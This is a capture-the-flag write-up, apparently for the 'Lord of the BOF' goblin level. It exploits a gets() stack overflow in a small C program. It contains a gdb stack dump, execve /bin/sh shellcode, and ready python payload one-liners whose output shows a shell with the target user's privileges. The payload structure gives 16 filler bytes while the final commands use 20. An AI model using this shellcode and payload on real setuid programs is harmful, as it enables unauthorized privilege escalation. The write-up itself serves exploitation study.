# Level 2, Cobolt -> Goblin

### goblin.c
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);               // -> Read input from stdin in routine
    printf("%s\n", buffer);
}
```

### Analysis

#### Disassembling the "goblin"
```
Dump of assembler code for function main:
0x80483f8 <main>:       push   %ebp
0x80483f9 <main+1>:     mov    %ebp,%esp
0x80483fb <main+3>:     sub    %esp,16
0x80483fe <main+6>:     lea    %eax,[%ebp-16]
0x8048401 <main+9>:     push   %eax
0x8048402 <main+10>:    call   0x804830c <gets>
0x8048407 <main+15>:    add    %esp,4
0x804840a <main+18>:    lea    %eax,[%ebp-16]
0x804840d <main+21>:    push   %eax
0x804840e <main+22>:    push   0x8048470
0x8048413 <main+27>:    call   0x804833c <printf>
0x8048418 <main+32>:    add    %esp,8
0x804841b <main+35>:    leave
0x804841c <main+36>:    ret
End of assembler dump.
```

#### Estimated Stack Structure

```
|  BUFFER (16 bytes)          |
|  SFP (4 bytes)              |
|  RET (4 bytes)              |
|  ARGC (4 bytes)             |
```

#### Observed Stack Structure (bp at *main+62)
```
Breakpoint 1, 0x804840a in main ()
(gdb) x/100x $esp
0xbffffb08:     0x41414141      0x41414141      0x41414141      0x41414141  -> The 'buffer[16]'
0xbffffb18:     0xbffffb00      0x400309cb      0x00000001      0xbffffb64  -> SFP, RET, ARGC, ARGV Pointer
0xbffffb28:     0xbffffb6c      0x40013868      0x00000001      0x08048350
0xbffffb38:     0x00000000      0x08048371      0x080483f8      0x00000001
0xbffffb48:     0xbffffb64      0x080482bc      0x0804844c      0x4000ae60
0xbffffb58:     0xbffffb5c      0x40013e90      0x00000001      0xbffffc5d
0xbffffb68:     0x00000000      0xbffffc74      0xbffffc85      0xbffffc9e
0xbffffb78:     0xbffffcbd      0xbffffcdf      0xbffffceb      0xbffffeae
0xbffffb88:     0xbffffecd      0xbffffee9      0xbffffefe      0xbfffff1c
0xbffffb98:     0xbfffff27      0xbfffff36      0xbfffff3e      0xbfffff4f
0xbffffba8:     0xbfffff59      0xbfffff67      0xbfffff78      0xbfffff86
0xbffffbb8:     0xbfffff91      0xbfffffa3      0x00000000      0x00000003
0xbffffbc8:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffbd8:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffbe8:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffbf8:     0x08048350      0x0000000b      0x000001f6      0x0000000c
0xbffffc08:     0x000001f6      0x0000000d      0x000001f6      0x0000000e
0xbffffc18:     0x000001f6      0x00000010      0x0fabfbff      0x0000000f
0xbffffc28:     0xbffffc58      0x00000000      0x00000000      0x00000000
0xbffffc38:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc48:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc58:     0x36383669      0x6f682f00      0x632f656d      0x6c6f626f
0xbffffc68:     0x6f672f74      0x6e696c62      0x006f632d      0x3d445750
0xbffffc78:     0x6d6f682f      0x6f632f65      0x746c6f62      0x4d455200
0xbffffc88:     0x4845544f      0x3d54534f      0x2e323931      0x2e383631
```

### Exploit

#### Payload Structure
```
'A'*16   # Filling with NOP
+
'\x48\xfb\xff\xbf'          # Shellcode address
+
'\x90'*200   # NOP Sled
+
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'  # shellcode
```

#### Shellcode (24 bytes)
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

1

```
python -c 'print "A"*20+"\x48\xfb\xff\xbf"+"\x90" * 200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; > test
./goblin < test
```

2

```
(python -c 'print "A"*20+"\x48\xfb\xff\xbf"+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; cat) | ./goblin
```

### Result

2번 방법

```
[cobolt@localhost cobolt]$ cat test | ./goblin
AAAAAAAAAAAAAAAAAAAAH▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
   ̀
[cobolt@localhost cobolt]$ (python -c 'print "A"*20+"\x48\xfb\xff\xbf"+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; cat) | ./goblin
AAAAAAAAAAAAAAAAAAAAH▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
   ̀
id
uid=502(cobolt) gid=502(cobolt) euid=503(goblin) egid=503(goblin) groups=502(cobolt)
my-pass
euid = 503
hackers proof
```